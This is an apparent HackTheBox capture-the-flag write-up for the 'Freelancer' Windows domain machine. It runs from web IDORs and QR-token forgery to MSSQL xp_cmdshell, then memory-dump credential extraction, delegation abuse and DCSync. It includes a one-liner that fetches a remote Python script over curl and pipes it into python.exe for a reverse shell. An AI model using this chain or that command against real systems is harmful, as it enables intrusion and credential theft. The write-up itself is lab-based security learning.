# PORT SCAN	
* **53** &#8594; DNS
* **80** &#8594; HTTP (NGINX 1.25.5)
* **88** &#8594; KERBEROS
* **135** &#8594; MSRPC
* **139 / 445** &#8594; SMB
* **389 / 636** &#8594; LDAP
* **5985** &#8594; WINRM
* **55297** &#8594; MSSQL EXPRESS 2019

<br><br><br>

# ENUMERATION & USER FLAG

The NSE on MSSQL EXPRESS server retrieved a lot of info about the domain.

![9058204d8a12445d45f9fe6f5545effd.png](img/9058204d8a12445d45f9fe6f5545effd.png)

All right pretty hard now because without an username we cannot access to nothing. I smash my head to the wall but I get the idea adter short delay, we have no username? Let's use [kerbrute](https://github.com/ropnop/kerbrute?tab=readme-ov-file)! Remember CTF are just games after all so we can use the SecLists username list and see if we get some results...

![25a238bf3f086eec50404d7b35115628.png](img/25a238bf3f086eec50404d7b35115628.png)

Damn, cool stuff! But sometimes this tool return some false positive but worry not we can check it with ASREP Roasting technique, luckly all the users are valide into the domain!

![799a562849d40523485481f1909c934f.png](img/799a562849d40523485481f1909c934f.png)

> I just saw an info box on HTB website that state the port 80 of freelancer can get some minutes to pop up. I had to restart to show it back so this is why I started directly with AD protocols...yeah sometimes thing are just a matter of small issue because I was pretty lost after this.

This is the website, 10/10 design score!

![f237068aba8ef788c01d802cf012aeeb.png](img/f237068aba8ef788c01d802cf012aeeb.png)

Ok cool stuff, we have 2 different register user type **<u>employer</u>** and **<u>freelacer</u>**! The only difference between this 2 is that for the employer role to be actived manually by someone in order to be used....interesting! Moreover we have another login form into `/admin`

![f57d663cfe8f63c8b1e255c7c9a8959c.png](img/f57d663cfe8f63c8b1e255c7c9a8959c.png)

Let's create a new freelancer account and let's try to understand what we have available....here you are!

![45db3bdcd9455433dbaee21293987504.png](img/45db3bdcd9455433dbaee21293987504.png)

We have now access to the Blog section where I found an employer profile named **<u>Crista Watterson</u>!**

![bcf6cf381a7b5a87c6433143c5b1c07e.png](img/bcf6cf381a7b5a87c6433143c5b1c07e.png)

The link to the profile reveals the ID `http://freelancer.htb/accounts/profile/visit/5/` interesting a sort of IDOR here!

With some tricks I found an employer account that I have created playing with ID and found that the one with ID 10019 is mine!

![6c98f538a35efc0c515e3a4f8821e807.png](img/6c98f538a35efc0c515e3a4f8821e807.png)

Now we have a ogic vulnerability here because look what is written into the **<u>Forgot Password</u>** section...

![36470cb1a1b868f0ed6f4c7589b38f74.png](img/36470cb1a1b868f0ed6f4c7589b38f74.png)

Yeah so in order to activate our we just need...to recover our password with a new one! We have control into the **employer dashboard** now!

![23ce7e8d1af78381f67280b0d92671af.png](img/23ce7e8d1af78381f67280b0d92671af.png)

Now let's look here, we have something new for an HTB machine a QR generator (refresh every 5 mins) that permits to login as this user we are authenticated with automatically. Now a QR code is simply an encoded URL and with this [website](https://qreader.online/) I was abel to read it and retrieve the URL.

![87572869600a9eb5ace653d2c10346b3.png](img/87572869600a9eb5ace653d2c10346b3.png)

Cool another IDOR because the path start with the base64 string of the user ID plus an (apparently) nonce which change every 5 mins. What if we change the first part with the base64 of `5`, the ID of Crista? 

![037ca093e23439fee1eb49a0678741fa.png](img/037ca093e23439fee1eb49a0678741fa.png)

Booom! Cool stuff now we know how to login as every user, we just need to find the ID. You know who have ID `2`? ADMIN!

![3a79c3335533744514886fd6e254ca15.png](img/3a79c3335533744514886fd6e254ca15.png)

Probably this user have some more option that would help us to going through! Well after login as this user we can navigate to **<u>/admin</u>** and thanks to the cookie obtained everything will be smooth!

![1237cb2e736017b33fd655e7b5a54315.png](img/1237cb2e736017b33fd655e7b5a54315.png)

SQL TERMINAL? OOOOOH UAAAAAU

![cfe437a4a4694dca4ff1a581cad46c1c.png](img/cfe437a4a4694dca4ff1a581cad46c1c.png)

Cool stuff eheheheh, I have checked if we can impersonate a sysadmin and well we can!


![fa4038fea0b159d9defeb85ab243b54d.png](img/fa4038fea0b159d9defeb85ab243b54d.png)

After enabling `xp_cmdshell` we can execute OS commands!

![abc2c8919e07a075af8f9177dd4c4a90.png](img/abc2c8919e07a075af8f9177dd4c4a90.png)


With some enumeration I found that Windows Defender is enabled but we have **<u>python.exe</u>** installed and with this small onhe liner I was able to execute a remote python reverse shell : `EXEC xp_cmdshell "curl http://10.10.14.11/re.py | python.exe";`

![2266fa0c2c2e7db75f7d9269f508e428.png](img/2266fa0c2c2e7db75f7d9269f508e428.png)

![8abb5afc17f48ae989cea9f413e806ba.png](img/8abb5afc17f48ae989cea9f413e806ba.png)

Inside the Download folder of sql_svc I found a **.INI** file thatcontains a password...if you watch Attack On Titan you already now who this password belongs to! 

![c51c516e6d549894e69af7911fe019ee.png](img/c51c516e6d549894e69af7911fe019ee.png)

![305ef395e866e902f6ceb3f429f5de66.png](img/305ef395e866e902f6ceb3f429f5de66.png)

Cool but no WinRM access, no worries because `RunasCs.exe` is here to save the day!

![5322d13445b2d52d817975c6f274e37a.png](img/5322d13445b2d52d817975c6f274e37a.png)

With the same python script I was able to receive a reverse shell as **<u>mikasaAckerman</u>** and we can read the first flag!

![398f540fa40b7f414663307c2c8c3a92.png](img/398f540fa40b7f414663307c2c8c3a92.png)




# PRIVILEGE ESCALATION

Inside the desktop folder of **mikasaAckerman** we have a saved note in txt format...

![08ab3da1565370b1ba0c24b3ae0be322.png](img/08ab3da1565370b1ba0c24b3ae0be322.png)

Interesting stuff, upload netact and use it to get locally the 7z archive which contains a `.DMP` file

![ac06a31dfc0cfd4a8ce4bd589c84adcd.png](img/ac06a31dfc0cfd4a8ce4bd589c84adcd.png)

Well I hate to use Windows no matter what the task is but I discover this really cool project, [memprocFS](https://github.com/ufrisk/MemProcFS). This tool permits to view dump files in ad-hoc filesystem. Really easy and game-changer I would reuse it for sure, documentation clear and easy to use!

![35cccd07b615673c2e6c30d1bb483999.png](img/35cccd07b615673c2e6c30d1bb483999.png)

![38f70a7af89220550c33114f4377d29c.png](img/38f70a7af89220550c33114f4377d29c.png)

In `sys/proc` we can view te processes that were running during the dump. Nothing usefull here...rip

![b8af2bd91f2caf6a12bb2d709dfb02b1.png](img/b8af2bd91f2caf6a12bb2d709dfb02b1.png)

Well the real deal here is the `registry/` path that contains `SAM`, `SAVE` and `SYSTEM`....**<u>pypykatz</u>** kicks in!

![57d284136af2bdb873f8a2bb1f9e5b58.png](img/57d284136af2bdb873f8a2bb1f9e5b58.png)

At the real end we have the LSA secrets (obviously the other hashes would not work into the machine domain) where we have 2 plaintext!

![c883f8fd3d54ec7a4b53ad2528939e3b.png](img/c883f8fd3d54ec7a4b53ad2528939e3b.png)

The last one worked with the user `lorra199`, finally!

![8a8fe600e0022471dd92ccb5ef5f3b62.png](img/8a8fe600e0022471dd92ccb5ef5f3b62.png)

Using bloodhound I was able to see that this user have genericWrite on the machine (Domain Controller) so Resourced Based Contrained Delegation can be achived! 

![e182d1ca3a5b435702cd85356fb65944.png](img/e182d1ca3a5b435702cd85356fb65944.png)


First thing first let's create a Computer object (quota is 10) that we fully controll


![570e99f4a43293ec9f303658803bec2b.png](img/570e99f4a43293ec9f303658803bec2b.png)

Let's allow this machine to delegate to the DC through **S4U2PROXY**

![92e6cc4c2255968ce6b530b81b48682b.png](img/92e6cc4c2255968ce6b530b81b48682b.png)

Now we can request a TGS impersonating the Administrator of the DC, smooth af! 

![21f324ea2f26da20a5bacd60a276c2d5.png](img/21f324ea2f26da20a5bacd60a276c2d5.png)

With DC-SYNC we are now in controll of the Domain Admin and we can use his hash to get the root flag!

![c2c1009fdd8d918b8a6bd2795fc12973.png](img/c2c1009fdd8d918b8a6bd2795fc12973.png)

> memprocFS is cool as fuck!
